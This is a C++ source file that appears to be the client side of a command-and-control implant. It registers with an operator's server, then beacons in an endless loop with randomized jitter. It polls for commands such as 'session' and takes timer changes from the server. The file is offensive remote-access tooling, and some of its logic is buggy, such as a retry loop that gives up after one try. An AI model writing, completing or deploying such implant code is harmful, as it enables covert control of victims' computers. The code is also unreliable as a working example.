#include <iostream>
#include <string>
#include <vector>
#include <tuple>
#include <stdexcept>
#include <curl/curl.h>
#include <json/json.h>
#include <cstdlib> 
#include <ctime>

#ifdef __unix__
#define OS "Linux"
#include "../Linux/generic.h"
#include <thread>
#include <chrono>
#endif

#ifdef WIN32
#include <windows.h>
#define OS "Windows"
#include "../Windows/generic.h"
#endif

size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* s) {
    size_t newLength = size * nmemb;
    try {
        s->append((char*)contents, newLength);
    } catch(std::bad_alloc &e) {
        // Handle memory problem
        return 0;
    }
    return newLength;
}

std::tuple<int, std::string, std::string> getRequest(const std::string& url) {
    CURL* curl;
    CURLcode res;
    long response_code;
    std::string response_body;

    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();
    if(curl) {
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_body);
        res = curl_easy_perform(curl);
        if(res != CURLE_OK) {
            return (std::make_tuple(-1, "", ""));
        }
        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
        curl_easy_cleanup(curl);
    }
    curl_global_cleanup();
    return std::make_tuple(response_code, response_body, url);
}

std::tuple<int, std::string> postRequest(const std::string& url, const std::string& jsonData) {
    CURL* curl;
    CURLcode res;
    long response_code;
    std::string response_body;

    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();
    if(curl) {
        struct curl_slist *headers = NULL;
        headers = curl_slist_append(headers, "Content-Type: application/json");

        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, jsonData.c_str());
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_body);
        res = curl_easy_perform(curl);
        if(res != CURLE_OK) {
            throw std::runtime_error("curl_easy_perform() failed: " + std::string(curl_easy_strerror(res)));
        }
        curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
        curl_easy_cleanup(curl);
        curl_slist_free_all(headers);
    }
    curl_global_cleanup();
    return std::make_tuple(response_code, response_body);
}


std::tuple<int, std::string, int> httpConnection(const std::string& address) {
    std::string hostname = "client";
    std::vector<std::string> ipAddresses = getIPAddresses();

    std::string url = "http://" + address + ":8080/connection?name=" + hostname + "&os=" + OS + "&address=127.0.0.1";
    std::cout << "Request URL: " << url << std::endl;

    auto [response_code, response_body, response_url] = getRequest(url);
    if (response_code == -1) {
        return std::make_tuple(-1, "", -1);
    }

    try {
        if (response_code == 200) {
            Json::Value data;
            Json::CharReaderBuilder readerBuilder;
            std::string errs;

            std::istringstream s(response_body);
            if (!Json::parseFromStream(readerBuilder, s, &data, &errs)) {
                throw std::runtime_error("Failed to parse JSON: " + errs);
            }
            if (data.isMember("timer") && data.isMember("uuid") && data.isMember("jitter")) {
                int timer = std::stoi(data["timer"].asString());
                std::string ID = data["uuid"].asString();
                int jitter = std::stoi(data["jitter"].asString());
                return std::make_tuple(timer, ID, jitter);
            } else {
                throw std::runtime_error("Invalid JSON response: " + response_body);
            }
        } else {
            throw std::runtime_error("Failed to connect to server: " + std::to_string(response_code) + " " + response_body);
        }
    } catch (const std::exception& e) {
        std::cerr << "Exception: " << e.what() << std::endl;
        throw;
    }
}

std::tuple<int, std::string, int> httpReconnect(const std::string& address, const std::string& user_id, int jitter, int timer) {
    std::string hostname = "client";
    std::vector<std::string> ipAddresses = getIPAddresses();

    std::string url = "http://" + address + ":8080/reconnect?name=" + hostname + "&os=" + OS + "&address=127.0.0.1&id=" + user_id + "&timer=" + std::to_string(timer) + "&jitter=" + std::to_string(jitter);
    std::cout << "Request URL: " << url << std::endl;

    auto [response_code, response_body, response_url] = getRequest(url);
    if (response_code == -1) {
        return std::make_tuple(-1, "", -1);
    }

    try {
        if (response_code == 200) {
            return std::make_tuple(response_code, response_body, 0);
        } else {
            throw std::runtime_error("Failed to reconnect to server: " + std::to_string(response_code) + " " + response_body);
        }
    } catch (const std::exception& e) {
        std::cerr << "Exception: " << e.what() << std::endl;
        throw;
    }
}

int beacon(const std::string& address, const std::string& ID, int jitter, int timer) {
    srand(time(0));
    while (true) {
        std::string url = "http://" + address + "/beacon?id=" + ID;
        std::cout << "Request URL: " << url << std::endl;

        int sign = (rand() % 2 == 0) ? 1 : -1;
        int sleepTime = timer + sign * (rand() % (jitter + 1));
        if (sleepTime < 0) {
            sleepTime = timer;
        }
        
        auto [response_code, response_body, response_url] = getRequest(url);
        if (response_code == -1) {
            int count = 0;
            while (count < 5) {
                count++;
                #ifdef _WIN32
                    Sleep(sleepTime * 1000);
                #else
                    std::this_thread::sleep_for(std::chrono::seconds(sleepTime));
                #endif
                auto [response_code, response_body, response_url] = getRequest(url);
                if (response_code == 200) {
                    break;
                }   
            return -1;
            } 
        }
        try {
            if (response_code == 200) {
                Json::Value data;
                Json::CharReaderBuilder readerBuilder;
                std::string errs;

                std::istringstream s(response_body);
                if (!Json::parseFromStream(readerBuilder, s, &data, &errs)) {
                    throw std::runtime_error("Failed to parse JSON: " + errs);
                }

                if (data.isMember("command")) {
                    std::string command = data["command"].asString();
                    std::string cid = data["command_uuid"].asString();

                    if (command == "session") {
                        return 1;
                    }
                }

                if (data.isMember("timer")) {
                    int newTimer = std::stoi(data["timer"].asString());
                    if (newTimer > 0) {
                        timer = newTimer;
                    } else {
                        std::cerr << "Invalid timer value received: " << newTimer << std::endl;
                    }
                }

                std::cout << "Sleeping for " << sleepTime << " seconds" << std::endl;

                #ifdef _WIN32
                    Sleep(sleepTime * 1000);
                #else
                    std::this_thread::sleep_for(std::chrono::seconds(sleepTime));
                #endif
            }
        } catch (const std::exception& e) {
            std::cerr << "Exception: " << e.what() << std::endl;
        }
    }
    return 0;
}